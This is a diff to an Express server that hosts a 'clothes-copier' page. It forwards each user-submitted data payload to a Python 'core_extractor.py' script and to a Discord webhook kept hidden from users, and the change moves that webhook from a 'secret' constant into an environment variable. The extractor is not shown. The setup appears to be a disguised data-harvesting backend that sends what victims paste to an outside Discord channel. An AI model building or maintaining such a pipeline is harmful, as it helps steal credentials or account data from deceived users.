@@ -11,9 +11,6 @@ app.use(express.urlencoded({ limit: '10mb', extended: true }));
 // Serve static files from public folder
 app.use(express.static(path.join(__dirname, 'public')));
 
-// Set your permanent secret Discord webhook URL here so users don't have to enter it
-const SECRET_DISCORD_WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
-
 // Route specifically for /clothes-copier
 app.get('/clothes-copier', (req, res) => {
     const targetFile = 'clothes-copier.html';
@@ -25,7 +22,7 @@ app.get('/clothes-copier', (req, res) => {
     }
 });
 
-// Optional: Redirect root to /clothes-copier
+// Redirect root to /clothes-copier
 app.get('/', (req, res) => {
     res.redirect('/clothes-copier');
 });
@@ -36,8 +33,14 @@ app.post('/api/process', (req, res) => {
         return res.status(400).json({ success: false, error: "Missing data payload" });
     }
 
+    // Pulls your webhook automatically from Render environment variables
+    const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+    if (!webhookUrl) {
+        return res.status(500).json({ success: false, error: "Webhook not configured on server" });
+    }
+
     execFile('python3', ['core_extractor.py', data], {
-        env: { ...process.env, DISCORD_WEBHOOK_URL: SECRET_DISCORD_WEBHOOK }
+        env: { ...process.env, DISCORD_WEBHOOK_URL: webhookUrl }
     }, (error, stdout, stderr) => {
         if (error) {
             return res.status(500).json({ success: false, error: "Extractor execution failed.", details: stderr || error.message });
